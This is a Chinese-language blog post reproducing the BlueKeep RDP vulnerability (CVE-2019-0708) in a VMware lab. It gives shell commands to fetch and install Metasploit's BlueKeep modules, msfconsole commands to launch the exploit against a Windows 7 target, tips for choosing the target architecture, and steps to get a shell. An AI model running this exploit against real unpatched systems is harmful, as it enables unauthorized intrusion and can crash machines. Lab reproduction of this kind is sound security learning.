---
title: CVE-2019-0708远程桌面代码执行漏洞复现
date: 2019-09-07 11:32:52
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - CVE-2019-0708
    - 漏洞复现
    - RDP
    - 3389
---
# 0x01 漏洞概述

Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。

2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序。

# 0x02 影响版本

该漏洞影响旧版本的Windows系统，包括：
Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP

Windows 8和Windows 10及之后版本不受此漏洞影响。

# 0x03 漏洞复现

## 环境搭建

### 靶机

本地使用`VMware Workstation Pro 15` 安装 `win7_x64 SP1`
并设置 允许任何人远程桌面连接
附上 Windows7 SP1下载链接

`ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908214611.png)

### 攻击机KALI
替换所需要的文件
Kali在Terminal下执行如下命令进行替换：
```
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/

cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/

cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/

cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/
```


msf升级到5

`apt install metasploit-framework`

进入msf,并重新加载利用模块

`msfconsole`
`reload_all`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908215218.png)

使用 **0708RDP** 攻击模块,并设置参数

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.134.133
set target 3
exploit
```
target是主机架构选择的意思，一定要选对，
vm装的win7sp1话，先试2，再试3，本文使用1也测试成功,建议试一次重启靶机一次。
选错架构会导致蓝屏、利用失败等问题

如果报如下错误:
```
Exploit failed: NameError undefined local variable or method `rdp_connect' for #<Msf::Modules::Exploit__Rdp__Cve_2019_0708_bluekeep_rce::MetasploitModule:0x00007fd83f439260>
Did you mean?  disconnect
[*] Exploit completed, but no session was created.
```
一般是`rdp.rb`没替换或者放错位置了,重新替换即可


建立连接以后,使用`shell`获得shell
再使用`python`获得交互式shell

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220553.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220636.png)


# 参考文章
[CVE-2019-0708远程桌面代码执行漏洞复现 - Qiita](https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961)
[Windows RDP的RCE漏洞分析和复现（CVE-2019-0708）](https://www.cnblogs.com/backlion/p/11482322.html?from=timeline)